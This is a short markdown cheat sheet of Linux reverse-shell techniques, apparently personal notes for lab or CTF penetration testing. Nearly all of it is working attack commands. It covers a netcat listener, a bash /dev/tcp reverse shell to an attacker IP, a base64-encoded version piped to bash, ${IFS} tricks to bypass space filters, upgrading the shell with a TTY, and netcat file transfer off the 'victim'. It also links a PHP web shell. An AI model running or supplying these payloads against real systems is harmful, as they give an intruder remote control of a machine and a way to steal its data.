# Linux Shells

All things linux shells

## Basic Reverse Shell

### Start Listener

```bash
rlwrap nc -lvp 9001
```

Note: Prepending `rlwrap` provides a more user-friendly shell experience

### Launch Connection

#### Start with basic shell code

```bash
bash -i >& /dev/tcp/10.10.14.177/9001 0>&1
```

#### Base64 encode it if necessary

- This allows us to bypass potential special character restrictions, while also ensuring the redirections and file descriptors are handled properly

```bash
echo 'bash -i >& /dev/tcp/10.10.14.191/9001 0>&1' | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvOTAwMSAwPiYxCg==
```

#### Encoded Payload

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvOTAwMSAwPiYxCg==' | base64 -d | bash
```

### Upgrade Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
ENTER
export TERM=xterm
```

Note: `export TERM=xterm` allows you clear screen with `ctrl+l`

### Bypass Filters

- Bypass space filter
	- Replacing spaces with `${IFS}` (possibly `${IFS%??}` if that doesn't work)
	- `echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvOTAwMSAwPiYxCg=='${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash`

### Links

- [revshells](https://www.revshells.com/)
- [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php)

---

## Miscellaneous

### Download files

#### On Kali

```bash
nc -lvp 1234 > example.txt
```

#### On victim

```bash
nc 10.10.14.177 1234 < example.txt
```

